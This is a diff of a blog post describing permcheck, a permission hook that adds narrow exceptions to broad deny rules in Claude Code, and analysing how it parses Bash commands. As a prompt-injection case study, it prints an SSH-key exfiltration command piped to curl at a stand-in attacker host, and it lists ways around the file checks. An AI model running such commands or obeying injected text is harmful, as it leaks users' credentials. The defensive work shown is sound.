@@ -11,34 +11,34 @@
   gtag('js', new Date());
   gtag('config', 'G-W1ZPH7MEP0');
 </script>
-<title>When Deny Doesn't Win: precise permissions for Claude Code</title>
-<meta name="description" content="Claude Code's fixed permission precedence has no way to express every narrow exception. Learn how permcheck uses containment-based carve-outs, and where its protection ends.">
+<title>The Case for Narrow Exceptions | Claude Code Permission Rules</title>
+<meta name="description" content="Allow selected commands inside a broad Claude Code deny rule, test each exception, and learn where permission hooks stop enforcing policy.">
 <link rel="canonical" href="https://blogs.zethian.com/when-deny-doesnt-win.html">
 <link rel="alternate" type="application/rss+xml" title="Zethian" href="/feed.xml">
 
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="Zethian">
-<meta property="og:title" content="When deny doesn't win">
-<meta property="og:description" content="A practical guide to precise Claude Code permissions, containment-based carve-outs, and the limits of a shell-aware hook.">
+<meta property="og:title" content="The Case for Narrow Exceptions in Claude Code Permissions">
+<meta property="og:description" content="Allow selected commands inside a broad deny, test each exception, and learn the limits of a shell-aware permission hook.">
 <meta property="og:url" content="https://blogs.zethian.com/when-deny-doesnt-win.html">
 <meta property="og:image" content="https://blogs.zethian.com/blog-assets/og-card.png">
 <meta property="og:image:width" content="2400">
 <meta property="og:image:height" content="1260">
-<meta property="og:image:alt" content="Social card for When deny doesn't win: a broad deny on aws with a narrower allow on aws describe commands, and the same call blocked by the native model but allowed by permcheck.">
+<meta property="og:image:alt" content="A broad deny rule with a narrower allow rule inside it.">
 
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="When deny doesn't win">
-<meta name="twitter:description" content="A practical guide to precise Claude Code permissions, containment-based carve-outs, and the limits of a shell-aware hook.">
+<meta name="twitter:title" content="The Case for Narrow Exceptions in Claude Code Permissions">
+<meta name="twitter:description" content="Allow selected commands inside a broad deny, test each exception, and learn the limits of a shell-aware permission hook.">
 <meta name="twitter:image" content="https://blogs.zethian.com/blog-assets/og-card.png">
-<meta name="twitter:image:alt" content="Social card for When deny doesn't win: a broad deny on aws with a narrower allow on aws describe commands, and the same call blocked by the native model but allowed by permcheck.">
+<meta name="twitter:image:alt" content="A broad deny rule with a narrower allow rule inside it.">
 
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "TechArticle",
-  "headline": "When deny doesn't win",
-  "alternativeHeadline": "Precise permissions for Claude Code",
-  "description": "Claude Code's fixed permission precedence has no way to express every narrow exception. Learn how permcheck uses containment-based carve-outs, and where its protection ends.",
+  "headline": "The Case for Narrow Exceptions",
+  "alternativeHeadline": "When deny doesn't win",
+  "description": "Allow selected commands inside a broad Claude Code deny rule, test each exception, and learn where permission hooks stop enforcing policy.",
   "author": {
     "@type": "Person",
     "name": "Saleem Mirza",
@@ -51,7 +51,7 @@
     "url": "https://blogs.zethian.com/"
   },
   "datePublished": "2026-07-30",
-  "dateModified": "2026-08-17",
+  "dateModified": "2026-08-28",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https://blogs.zethian.com/when-deny-doesnt-win.html"
@@ -70,34 +70,21 @@
   <article>
     <header class="hero measure">
       <p class="eyebrow">Permission engineering · Claude Code</p>
-      <h1>When deny doesn't win</h1>
+      <h1 class="headline-compact">The Case for Narrow Exceptions</h1>
       <div class="rule-mark" aria-hidden="true"><span></span><span></span><span></span></div>
-      <p class="dek">A poisoned issue turns an allowed shell into an SSH-key exfiltration path. The hard part is blocking the protected read without blocking every legitimate command around it.</p>
+      <p class="dek">You want the agent to run a tool’s read-only commands and none of its destructive ones. In Claude Code you can’t write that policy, because deny always wins. permcheck is a permission hook that lets you write it.</p>
       <div class="meta">
         <span>By <a href="https://www.linkedin.com/in/saleem-mirza/" rel="me author noopener noreferrer" target="_blank">Saleem Mirza</a></span>
-        <span>12 min read</span>
-        <span>Updated August 17, 2026</span>
+        <span>9 min read</span>
+        <span>Updated August 28, 2026</span>
       </div>
-      <p class="author-note">Saleem Mirza, creator of permcheck, is a cloud and platform architect with 20+ years designing AWS, Kubernetes, and DevSecOps systems in regulated enterprise and federal environments.</p>
+      <p class="author-note">Saleem Mirza created permcheck and has spent more than 20 years designing AWS, Kubernetes, and DevSecOps systems for regulated enterprise and federal environments.</p>
     </header>
 
     <div class="measure">
-      <aside class="brief" aria-label="Short version">
-        <p class="label">Short version</p>
-        <p>Claude Code's native permissions use fixed precedence: <code>deny</code> beats <code>ask</code>, which beats <code>allow</code>. permcheck adds a narrower exception inside its own policy file: an <code>allow</code> or <code>ask</code> carves through a matching <code>deny</code> only when its match-set is a strict subset. It is a precision layer, not a sandbox.</p>
-        <p><a href="#auto-mode">Auto mode</a> solves a different problem: its classifier asks whether an unresolved action fits the current request and environment. permcheck asks whether the exact call sits inside an envelope the policy author already approved. Use the classifier for judgment calls; use deterministic rules for decisions that must survive a new prompt, model, provider, or CI run unchanged.</p>
-        <p>The native way to cut prompts scales badly: one reported allow-list grew past 900 rules and still prompted on safe command chains. A permcheck rule check runs in about 1.7 ms, spends no tokens, and returns the same verdict every time.</p>
-      </aside>
-
       <div class="callout">
-        <p class="label">Decision for security and platform leaders</p>
-        <p>Claude Code already provides deterministic permissions, contextual auto-mode review, and sandbox containment. The remaining gap is a broad restriction with a narrow, machine-testable exception: permit cloud inspection, for example, while prohibiting mutation. permcheck fills that policy gap, and its engine source is public at <a href="https://github.com/saleem-mirza/permcheck" rel="noopener noreferrer" target="_blank">saleem-mirza/permcheck</a>, so the matcher a policy review depends on is itself reviewable. Evaluate it where agent permissions must be reviewed like code, asserted in CI, and reproduced during an audit, not as a replacement for managed denies or an execution sandbox.</p>
-        <p><strong>What it costs:</strong> you maintain one JSON policy file. The engine is a short-lived binary with no service, no network calls, and no tokens. Backing out is disabling the plugin, which returns every decision to the native model.</p>
-      </div>
-
-      <div class="callout">
-        <p class="label">60-second try it</p>
-        <p>On macOS, grab <a href="blog-assets/sample-policy.json" download="sample-policy.json">sample-policy.json</a> and watch a broad deny hold while its narrower carve-out passes (Linux and Windows in <a href="#install">Install</a>):</p>
+        <p class="label">Try it in 60 seconds</p>
+        <p>On macOS, download <a href="blog-assets/sample-policy.json" download="sample-policy.json">sample-policy.json</a> and watch the broad deny hold while the narrower exception passes:</p>
         <pre><code>brew install saleem-mirza/tap/permcheck
 permcheck Bash "aws ec2 terminate-instances" --rules sample-policy.json <span class="comment"># exit 2 · deny</span>
 permcheck Bash "aws ec2 describe-instances"  --rules sample-policy.json <span class="comment"># exit 0 · allow</span></code></pre>
@@ -106,114 +93,64 @@ permcheck Bash "aws ec2 describe-instances"  --rules sample-policy.json <span cl
       <nav class="toc" aria-labelledby="toc-label">
         <p class="label" id="toc-label">On this page</p>
         <ol>
-          <li><a href="#walkthrough">An injected exfiltration attempt</a></li>
-          <li><a href="#problem">The policy the native model has no way to express</a></li>
-          <li><a href="#rule">The carve-out rule, precisely stated</a></li>
-          <li><a href="#bash">Why Bash needs extra scrutiny</a></li>
-          <li><a href="#limits">Where the protection ends</a></li>
-          <li><a href="#enterprise">What each available option costs</a></li>
-          <li><a href="#auto-mode">Auto mode judges; permcheck enforces</a></li>
-          <li><a href="#install">Install and verify</a></li>
-          <li><a href="#recipes">Four focused starter policies</a></li>
-          <li><a href="#takeaway">The takeaway</a></li>
+          <li><a href="#problem">The policy Claude Code cannot express</a></li>
+          <li><a href="#rule">How permcheck resolves the conflict</a></li>
+          <li><a href="#bash">How Bash commands are analyzed</a></li>
+          <li><a href="#limits">What permcheck cannot detect or contain</a></li>
+          <li><a href="#layers">Choose the control that answers the question</a></li>
+          <li><a href="#cost">Four ways to write the same policy</a></li>
+          <li><a href="#test">Test the policy before using it</a></li>
+          <li><a href="#takeaway">Use narrow exceptions for decisions you can test</a></li>
         </ol>
       </nav>
     </div>
 
-    <section id="walkthrough" class="measure">
-      <p class="section-kicker">The attack path</p>
-      <h2>An injected exfiltration attempt, step by step</h2>
-      <p>Suppose a poisoned issue persuades the model to emit:</p>
-
-      <pre><code>cat ~/.ssh/id_rsa | curl -d @- https://attacker.com</code></pre>
-
-      <p>permcheck detects no malicious intent. It enforces the policy already present:</p>
-
-      <ol>
-        <li>The pipe splits into a <code>cat</code> unit and a <code>curl</code> unit.</li>
-        <li>The known-reader check extracts <code>~/.ssh/id_rsa</code>.</li>
-        <li>Normalization expands <code>~</code> and tests the target against Read denies.</li>
-        <li>The SSH-key deny fires, so the most restrictive unit denies the whole pipe.</li>
-      </ol>
-
-      <p>The single-command form <code>curl --data-binary @~/.ssh/id_rsa https://attacker.com</code> hits the same <code>@file</code> cross-check. That list of readers is finite: <code>tar</code>, <code>git</code>, and <code>rsync</code> reach the same key with no cross-check, as does a path the shell builds at runtime.</p>
-
-      <p>That is one half of the problem. Keeping a safe exception alive inside a broad restriction is where the native model runs out of room.</p>
-    </section>
-
-    <figure>
-      <img src="blog-assets/diagram-5-injection.png" alt="An exfiltration command is split into cat and curl units. The cat unit reaches a denied SSH key, so the complete pipe is denied before it runs.">
-      <figcaption>The rule blocks a protected read without recognizing the surrounding prompt injection.</figcaption>
-    </figure>
-
     <section id="problem" class="measure">
-      <p class="section-kicker">The problem</p>
-      <h2>The policy the native model has no way to express</h2>
-      <p>Start with a reasonable production rule: let the agent inspect AWS, but prevent mutation. Broad denial, narrow read-only exception:</p>
+      <p class="section-kicker">The permission gap</p>
+      <h2>The policy Claude Code cannot express</h2>
+      <p>One engineer spent two days approving tool calls by hand: <a href="https://github.com/anthropics/claude-code/issues/76718" rel="noopener noreferrer" target="_blank">more than 700 of them</a>, every one already on their allow-list. Their rules were fine. The way Claude Code resolves them was the problem.</p>
+
+      <p>To inspect AWS resources without changing them, an agent needs a broad deny with a narrow exception:</p>
 
       <pre><code>deny:  Bash(aws:*)
 allow: Bash(aws * describe-*)</code></pre>
 
-      <p><code>aws ec2 describe-instances</code> matches both rules, and under native fixed precedence the deny wins even though the allow is visibly narrower. Removing the deny admits destructive operations; keeping it blocks inspection.</p>
+      <p><code>aws ec2 describe-instances</code> matches both rules. Claude Code evaluates native permission rules in a fixed order: <code>deny</code>, then <code>ask</code>, then <code>allow</code>. The deny blocks the command even though the allow rule is narrower. Removing the deny permits destructive AWS operations, but keeping it blocks inspection.</p>
 
-      <p>The mirror policy fails differently. Documented precedence puts <code>ask</code> above <code>allow</code>, so "allow everything, confirm the destructive commands" should work. <a href="https://github.com/anthropics/claude-code/issues/6527" rel="noopener noreferrer" target="_blank">claude-code#6527</a>, open and labeled <code>bug</code> and <code>area:security</code>, reports otherwise: a bare <code>Bash</code> token in <code>allow</code> suppresses the <code>ask</code> list, and <code>rm test.txt</code> runs unprompted.</p>
+      <p>The language model does not make this decision: <a href="https://code.claude.com/docs/en/permissions" rel="noopener noreferrer" target="_blank">Claude Code enforces the permission rules</a> before a tool call runs.</p>
 
-      <p>permcheck ranks <code>allow</code> against <code>ask</code> by specificity rather than tier, so the narrow ask outranks the bare allow. That policy, copied from the issue, behaves as its reporter expected:</p>
+      <p>Without a working exception, teams choose between two costs: loosen the deny, or approve calls by hand. The approvals pile up because Claude Code matches each segment of a compound command independently.</p>
 
-      <pre><code><span class="comment"># allow: ["Bash"]   ask: ["Bash(rm *)", "Bash(git push*)"]</span>
-permcheck Bash "rm test.txt"                   <span class="comment"># exit 1 · ask</span>
-permcheck Bash "touch test.txt &amp;&amp; rm test.txt" <span class="comment"># exit 1 · ask</span>
-permcheck Bash "ls -la"                        <span class="comment"># exit 0 · allow</span></code></pre>
+      <p>I built permcheck to close this gap: a narrower <code>allow</code> or <code>ask</code> can override a matching <code>deny</code> only when the deny already covers every call the exception matches.</p>
     </section>
 
     <figure>
-      <img src="blog-assets/diagram-2-native-vs-permcheck.png" alt="The same AWS describe command meets the same two rules in both models. The native model matches the deny first and stops, so the allow is never reached. permcheck tests the allow against the deny, finds it is a strict subset, and allows the call.">
-      <figcaption>Both models match the deny. Native stops there; permcheck tests whether the allow matches anything the deny does not.</figcaption>
+      <img src="blog-assets/diagram-2-native-vs-permcheck.png" alt="The AWS describe command matches a broad deny and a narrow allow. Claude Code applies the deny first. permcheck checks that the allow is contained by the deny and permits the call.">
+      <figcaption>Claude Code applies fixed tier precedence. permcheck first checks whether the narrower rule is contained by the deny.</figcaption>
     </figure>
-
-    <div class="measure">
-      <p>permcheck asks a more useful question of the same two rules: <em>does the exception match anything the restriction does not?</em> Here, no. Every command matching <code>aws * describe-*</code> also matches <code>aws:*</code>, so the allow is a genuine carve-out.</p>
-    </div>
 
     <section id="rule" class="wide-section">
       <div class="measure">
-        <p class="section-kicker">The decision</p>
-        <h2>The carve-out rule, precisely stated</h2>
-        <p>permcheck gathers every rule matching the call, then resolves in three steps:</p>
+        <p class="section-kicker">Rule evaluation</p>
+        <h2>How permcheck resolves the conflict</h2>
+        <p>permcheck reads its own rules file, separate from Claude Code’s <code>settings.json</code>. It cannot override a deny declared there, so a broad deny and its narrow exception both have to live in the permcheck file.</p>
+
+        <p>Within that file, permcheck collects every rule that matches the call, then resolves them in three steps:</p>
 
         <ol>
-          <li>An <code>allow</code> or <code>ask</code> carves out a matching <code>deny</code> only when its match-set is a <strong>strict subset</strong> of it.</li>
-          <li>Any matching deny left uncarved denies the call.</li>
-          <li>Otherwise the most specific matching <code>allow</code> or <code>ask</code> wins, and a tie goes to <code>ask</code>.</li>
+          <li>An <code>allow</code> or <code>ask</code> overrides a matching <code>deny</code> only when its match-set is a strict subset of the deny’s.</li>
+          <li>Any deny still matching after step one blocks the call.</li>
+          <li>Otherwise, the most specific matched <code>allow</code> or <code>ask</code> wins. A tie goes to <code>ask</code>.</li>
         </ol>
 
-        <div class="callout warn">
-          <p class="label">A prompt disappears</p>
-          <p>Containment governs conflicts with <code>deny</code>. Specificity settles <code>allow</code> against <code>ask</code>, so a more-specific allow removes the prompt. Write these two rules and the confirmation silently stops firing:</p>
-          <pre><code><span class="key">"allow"</span>: [<span class="string">"Bash(git push --dry-run:*)"</span>],
-<span class="key">"ask"</span>:   [<span class="string">"Bash(git push:*)"</span>]
+        <p>In the AWS example, every command matching <code>aws * describe-*</code> also matches <code>aws:*</code>. The exception applies to <code>aws ec2 describe-instances</code>, but not to <code>aws ec2 terminate-instances</code>.</p>
 
-permcheck Bash "git push --dry-run"   <span class="comment"># exit 0 · allow, no prompt</span></code></pre>
-          <p>The CLI lints this at author time, naming both rules on stderr; hook mode stays silent. It reads rules in isolation, so it also warns on shapes that still prompt. A clean lint is not a cleared policy; a warning is not a lost prompt.</p>
-        </div>
-
-        <p>Specificity is a score: literal characters count, and an exact specifier gets a fixed bonus. It selects among allow/ask rules and never rescues an allow that merely overlaps a deny.</p>
-
-        <p>Containment is a claim about match-sets, not behavior. Proving <code>aws * describe-*</code> sits inside <code>aws:*</code> shows the exception is narrower, not that describing an instance is safe. That judgment stays with the author.</p>
-
-        <div class="callout">
-          <p class="label">Predict the verdict</p>
-          <p>Given <code>deny: Bash(kubectl get secret:*)</code> and <code>allow: Bash(kubectl get * --namespace dev)</code>, what happens to <code>kubectl get secret --namespace dev</code>? The allow is longer, but is it contained by the deny?</p>
-          <details class="more-details">
-            <summary>Check your answer</summary>
-            <p><strong>Deny.</strong> The allow also matches <code>kubectl get pods --namespace dev</code>, which the secret deny never matches, so it reaches outside the deny instead of refining it. Length is not containment.</p>
-          </details>
-        </div>
+        <p>The subset check works only within permcheck’s supported matcher grammar. It proves that one pattern contains another, but not that an allowed command is harmless. The policy author must decide which operations are safe.</p>
       </div>
 
-      <div class="table-wrap" role="region" aria-label="Verdicts for four example calls, scrollable" tabindex="0">
+      <div class="table-wrap" role="region" aria-label="Example policy verdicts, scrollable" tabindex="0">
         <table>
-          <caption>How the carve-out rule resolves four calls against the teaching policy.</caption>
+          <caption>Example results under a policy with broad denies and narrow exceptions.</caption>
           <thead>
             <tr><th scope="col">Call</th><th scope="col">Verdict</th><th scope="col">Reason</th></tr>
           </thead>
@@ -221,7 +158,7 @@ permcheck Bash "git push --dry-run"   <span class="comment"># exit 0 · allow, n
             <tr>
               <td><code>aws ec2 describe-instances</code></td>
               <td><span class="verdict allow">Allow</span></td>
-              <td>A strict subset of the AWS deny.</td>
+              <td>The describe rule is contained by the AWS deny.</td>
             </tr>
             <tr>
               <td><code>aws ec2 terminate-instances</code></td>
@@ -231,401 +168,259 @@ permcheck Bash "git push --dry-run"   <span class="comment"># exit 0 · allow, n
             <tr>
               <td><code>aws iam delete-user --user-name describe-me</code></td>
               <td><span class="verdict deny">Deny</span></td>
-              <td>The one-token service slot puts <code>describe-*</code> on the operation, not an argument.</td>
+              <td>The operation is <code>delete-user</code>; text in a later argument does not satisfy the exception.</td>
             </tr>
             <tr>
               <td><code>Read /etc/passwd</code></td>
               <td><span class="verdict allow">Allow</span></td>
-              <td>The same rule outside Bash: a strict subset of the <code>Read(/etc/**)</code> deny. <code>/etc/shadow</code> denies.</td>
+              <td>Under <code>deny: Read(/etc/**)</code> with <code>allow: Read(/etc/passwd)</code>, the literal allow is contained by the deny. <code>/etc/shadow</code> remains denied.</td>
             </tr>
           </tbody>
         </table>
       </div>
 
+      <div class="callout">
+        <p class="label">Predict the verdict</p>
+        <p>Given <code>deny: Bash(kubectl get secret:*)</code> and <code>allow: Bash(kubectl get * --namespace dev)</code>, what happens to <code>kubectl get secret --namespace dev</code>? The allow is longer, but is it contained by the deny?</p>
+        <details class="more-details">
+          <summary>Check your answer</summary>
+          <p><strong>Deny.</strong> The allow also matches <code>kubectl get pods --namespace dev</code>, which the secret deny never matches, so the allow reaches outside the deny instead of refining it. Length is not containment.</p>
+        </details>
+      </div>
+
       <div class="measure">
-        <p>If nothing matches, <code>defaultMode</code> decides: <code>ask</code> prompts, while <code>deny</code>, a missing key, or any unrecognized value denies and draws a lint warning. Use <code>deny</code> for headless automation, where an unanswered prompt is no policy at all.</p>
+        <h3>Allow and ask conflicts</h3>
+        <p>Native precedence puts <code>ask</code> above <code>allow</code>, so “allow everything, but confirm the destructive commands” should work. <a href="https://github.com/anthropics/claude-code/issues/6527" rel="noopener noreferrer" target="_blank">claude-code#6527</a> reports that it doesn’t: a bare <code>Bash</code> entry in <code>allow</code> can suppress the <code>ask</code> list, so a command meant to prompt runs unprompted.</p>
+
+        <p>permcheck ranks <code>allow</code> against <code>ask</code> by specificity rather than by tier: whenever both match, the more specific rule wins, regardless of which list it’s in. A more specific allow removes the prompt:</p>
+
+        <pre><code><span class="key">"allow"</span>: [<span class="string">"Bash(git push --dry-run:*)"</span>],
+<span class="key">"ask"</span>:   [<span class="string">"Bash(git push:*)"</span>]
+
+permcheck Bash "git push --dry-run"   <span class="comment"># exit 0 · allow</span></code></pre>
+
+        <p>The CLI linter reports this relationship so the author can confirm that removing the prompt is intentional. Lint warnings are advisory, so policy tests should cover every call that must prompt or fail.</p>
+
+        <p>If no rule matches, permcheck’s <code>defaultMode</code> either prompts (<code>ask</code>) or denies. A missing or unrecognized value also denies. This policy setting is separate from Claude Code’s session setting with the same name.</p>
       </div>
     </section>
 
     <section id="bash" class="measure">
-      <p class="section-kicker">The hard part</p>
-      <h2>Why Bash needs extra scrutiny</h2>
-      <p>Matching <code>Bash(aws:*)</code> is easy when the command begins with <code>aws</code>. Real commands arrive in chains, behind wrappers, and through alternate file-access tools, so permcheck adds three checks first.</p>
+      <p class="section-kicker">Shell commands</p>
+      <h2>How Bash commands are analyzed</h2>
+      <p>A rule such as <code>Bash(aws:*)</code> is straightforward when a command starts with <code>aws</code>. Pipelines, wrappers, substitutions, and file operations require more analysis. Before applying its policy, permcheck runs three checks.</p>
     </section>
 
     <div class="three-up">
       <div class="card">
-        <h3>1. Split compounds</h3>
-        <p>Separate units at <code>&amp;&amp;</code>, <code>||</code>, pipes, semicolons, backgrounds, and newlines. Extract commands from <code>$(…)</code>, backticks, process substitutions, subshells, and brace groups.</p>
+        <h3>Split compound commands</h3>
+        <p>permcheck separates commands at <code>&amp;&amp;</code>, <code>||</code>, pipes, semicolons, background operators, and newlines, and extracts several common nested forms.</p>
       </div>
       <div class="card">
-        <h3>2. Peel wrappers</h3>
-        <p>Re-evaluate commands behind wrappers such as <code>env</code>, <code>sudo</code>, <code>timeout</code>, and <code>doas</code>, and behind leading reserved words such as <code>if</code>, <code>while</code>, and <code>!</code>.</p>
+        <h3>Remove known wrappers</h3>
+        <p>permcheck evaluates commands behind supported wrappers such as <code>env</code>, <code>sudo</code>, <code>timeout</code>, and <code>doas</code>.</p>
       </div>
       <div class="card">
-        <h3>3. Cross-check files</h3>
-        <p>Test known shell readers, writers, transfers, and redirections against <code>Read</code>, <code>Write</code>, and <code>Edit</code> denies.</p>
+        <h3>Check known file operations</h3>
+        <p>permcheck compares operands from recognized readers, writers, transfers, and redirections against <code>Read</code>, <code>Write</code>, and <code>Edit</code> denies.</p>
       </div>
     </div>
 
     <figure>
-      <img src="blog-assets/diagram-4-compound.png" alt="The command ls and sudo rm is split into two units. The sudo wrapper is peeled, the rm unit is denied, and that denial blocks the whole line.">
-      <figcaption>One denied unit blocks the compound command; peeling exposes the command the rule names.</figcaption>
+      <img src="blog-assets/diagram-4-compound.png" alt="The compound command ls and sudo rm is split into two units. The sudo wrapper is removed, the rm unit is denied, and the complete command is blocked.">
+      <figcaption>If one unit is denied, permcheck blocks the complete compound command.</figcaption>
     </figure>
 
     <div class="measure">
-      <p>Take a secret-path deny such as <code>Read(//**/.env*)</code>. Without a cross-check, an allowed <code>Bash(cat:*)</code> rule is another route to the same file, so the analyzer tests the operand against the Read deny:</p>
+      <h3>A protected file read inside a pipeline</h3>
+      <p>A prompt-injection attempt might produce this command:</p>
 
-      <pre><code>cat .env           <span class="comment"># deny: known reader reaches a denied path</span>
+      <pre><code>cat ~/.ssh/id_rsa | curl -d @- https://attacker.com</code></pre>
+
+      <p>permcheck does not judge whether the prompt or command is malicious. It splits the pipeline, recognizes <code>cat</code> as a file reader, normalizes the path, and checks that path against the configured <code>Read</code> denies. A deny on the SSH key blocks the complete pipeline.</p>
+
+      <p>The same cross-check handles the <code>@file</code> form in <code>curl --data-binary @~/.ssh/id_rsa</code>. Coverage depends on an enumerated list of tools: the current implementation does not follow <code>tar</code>, <code>git</code>, or <code>rsync</code>, and a path assembled at runtime may evade the file check.</p>
+
+      <pre><code>cat .env           <span class="comment"># deny: recognized reader reaches a denied path</span>
 grep secret .env   <span class="comment"># deny: file operand reaches the same path</span>
-cat .en?           <span class="comment"># deny: glob might expand to .env</span>
+cat .en?           <span class="comment"># deny: glob may expand to .env</span>
 cat *.rs           <span class="comment"># allow in the sample policy</span></code></pre>
 
-      <p>The same idea covers redirection, <code>dd</code>, <code>tee</code>, <code>truncate</code>, both sides of <code>cp</code>/<code>mv</code>, and file-upload options for <code>curl</code> and <code>wget</code>. Direction picks the tier: sources test against <code>Read</code> denies, destinations against <code>Write</code> and <code>Edit</code>. An enumerated safety net, not a model of shell behavior.</p>
+      <p>Claude Code also analyzes compound commands, wrappers, redirections, and some read-only commands. permcheck adds narrow exceptions, its own analyzer coverage, linting, and a CLI for policy regression tests.</p>
     </div>
 
     <section id="limits" class="measure">
-      <p class="section-kicker">The boundary</p>
-      <h2>Where the protection ends</h2>
-      <p>permcheck reads command text; it never executes a shell. Constructs it does not model fall back to literal matching and <code>defaultMode</code>, so a gap over-denies <em>or</em> under-denies.</p>
+      <p class="section-kicker">Limits</p>
+      <h2>What permcheck cannot detect or contain</h2>
+      <p>permcheck reads the command before it runs. It does not contain the process afterward. If a command gets through, nothing in permcheck stops it from reaching your filesystem or the network.</p>
 
       <div class="limits-list">
         <div class="limit-item">
-          <h3>Runtime-built behavior</h3>
-          <p>Variables, functions, aliases, <code>eval</code>, and generated arguments hide the target.</p>
-          <span class="boundary"><strong>Put the guarantee in:</strong> OS sandbox and enterprise restrictions</span>
+          <h3>Runtime-generated commands</h3>
+          <p>Variables, functions, aliases, <code>eval</code>, and generated arguments can hide the command or target.</p>
+          <span class="boundary"><strong>Use:</strong> deny-by-default rules, managed restrictions, and OS isolation</span>
         </div>
         <div class="limit-item">
-          <h3>Command-carrying arguments</h3>
-          <p><code>sh -c</code>, <code>bash -c</code>, <code>exec</code>, and <code>find -exec</code> pass a command as an argument. The analyzer decides the outer call, so the inner one reaches <code>defaultMode</code> unless a rule names the interpreter.</p>
-          <span class="boundary"><strong>Put the guarantee in:</strong> a rule on the interpreter, plus deny-by-default and sandbox</span>
+          <h3>Commands passed as arguments</h3>
+          <p><code>sh -c</code>, <code>bash -c</code>, <code>exec</code>, and <code>find -exec</code> can carry another command. The outer invocation needs an explicit rule.</p>
+          <span class="boundary"><strong>Use:</strong> interpreter rules and an execution sandbox</span>
         </div>
         <div class="limit-item">
-          <h3>Enumerated file tools</h3>
-          <p><code>cp</code>/<code>mv</code> are covered; <code>tar</code>, <code>git</code>, <code>rsync</code>, and editors are not followed.</p>
-          <span class="boundary"><strong>Put the guarantee in:</strong> explicit Bash rules and filesystem isolation</span>
+          <h3>Unrecognized file tools</h3>
+          <p>The file cross-check covers a finite list. Tools outside that list can reach the same paths.</p>
+          <span class="boundary"><strong>Use:</strong> explicit command rules and filesystem isolation</span>
         </div>
         <div class="limit-item">
-          <h3>Non-POSIX shells</h3>
-          <p>PowerShell and <code>cmd.exe</code> get no POSIX splitter, wrapper, or reader model.</p>
-          <span class="boundary"><strong>Put the guarantee in:</strong> platform-native controls</span>
+          <h3>Other shell grammars</h3>
+          <p>PowerShell and <code>cmd.exe</code> get no POSIX command splitting, wrapper handling, or file analysis.</p>
+          <span class="boundary"><strong>Use:</strong> platform-native controls</span>
         </div>
         <div class="limit-item">
-          <h3>No network boundary</h3>
-          <p>Blocking selected clients never proves another allowed process will not open a socket.</p>
-          <span class="boundary"><strong>Put the guarantee in:</strong> network sandbox or firewall</span>
+          <h3>Network access</h3>
+          <p>Denying known clients does not prevent another allowed process from opening a socket.</p>
+          <span class="boundary"><strong>Use:</strong> a network sandbox or firewall</span>
         </div>
       </div>
 
       <div class="callout warn">
-        <p class="label">Fail-closed, with one packaging exception</p>
-        <p>The engine returns <code>deny</code> for invalid input, invalid rules, missing tool names, bounded-recursion failures, and internal panics. The plugin wrapper falls back to Claude Code's native flow if its binary is missing, so a packaging mismatch does not brick every call.</p>
+        <p class="label">Check the plugin installation</p>
+        <p>The engine returns <code>deny</code> for malformed input, invalid rules, recursion limits, and internal failures. A missing plugin binary prevents the wrapper from enforcing the permcheck policy, so Claude Code falls back to its native permission flow. Keep non-negotiable denies in managed native settings and monitor the plugin installation.</p>
       </div>
     </section>
 
-    <figure>
-      <img src="blog-assets/diagram-6-stack.png" alt="A four-layer stack places prompt intent above permcheck, native Claude Code permissions, and the OS sandbox and managed settings at the base.">
-      <figcaption>permcheck adds policy precision. Native permissions and the OS boundary still decide what holds.</figcaption>
-    </figure>
+    <section id="layers" class="measure">
+      <p class="section-kicker">Control selection</p>
+      <h2>Choose the control that answers the question</h2>
+      <p>Claude Code permissions, auto mode, permcheck, and execution sandboxes answer different security questions.</p>
 
-    <section id="enterprise" class="measure">
-      <p class="section-kicker">The alternatives</p>
-      <h2>What each available option costs</h2>
-      <p>One engineer approved <a href="https://github.com/anthropics/claude-code/issues/76718" rel="noopener noreferrer" target="_blank">700+ tool calls over two days</a>, every segment already on the allow-list. Claude Code matches each segment of a compound command independently, so a 900+ rule allow-list still prompted on a chain of <code>git status</code> and <code>gh pr list</code>. That is what running out of allow rules looks like. That author ended up writing the pipeline above.</p>
-
-      <p>So compare the options on one workload. The first three columns below are native shapes, the fourth is not, and every column bills someone. Read the totals row first.</p>
-    </section>
-
-    <div class="table-wrap" role="region" aria-label="Seven incident commands under four policy shapes, scrollable" tabindex="0">
-      <table>
-        <caption>Seven commands from one incident session, under each native policy shape and under permcheck.</caption>
-        <thead>
-          <tr>
-            <th scope="col">Incident session command</th>
-            <th scope="col">Deny <code>kubectl</code>, <code>aws</code>, <code>terraform</code></th>
-            <th scope="col">Allow them</th>
-            <th scope="col">Leave unlisted (<code>defaultMode: ask</code>)</th>
-            <th scope="col">permcheck carve-outs</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr><td><code>kubectl get pods --namespace prod</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict allow">Allow</span></td></tr>
-          <tr><td><code>aws ec2 describe-instances</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict allow">Allow</span></td></tr>
-          <tr><td><code>terraform plan -out tf.plan</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict allow">Allow</span></td></tr>
-          <tr><td><code>aws s3 ls s3://audit-logs</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
-          <tr><td><code>terraform apply tf.plan</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
-          <tr><td><code>kubectl delete pod api-7f9 --namespace prod</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
-          <tr><td><code>kubectl get secret db-creds --namespace prod</code></td><td><span class="verdict deny">Deny</span></td><td><span class="verdict allow">Allow</span></td><td><span class="verdict ask">Ask</span></td><td><span class="verdict deny">Deny</span></td></tr>
-          <tr><td><strong>Totals</strong></td><td><strong>0 allow · 7 deny</strong></td><td><strong>7 allow · 0 deny</strong></td><td><strong>7 prompts</strong></td><td><strong>3 allow · 4 deny</strong></td></tr>
-        </tbody>
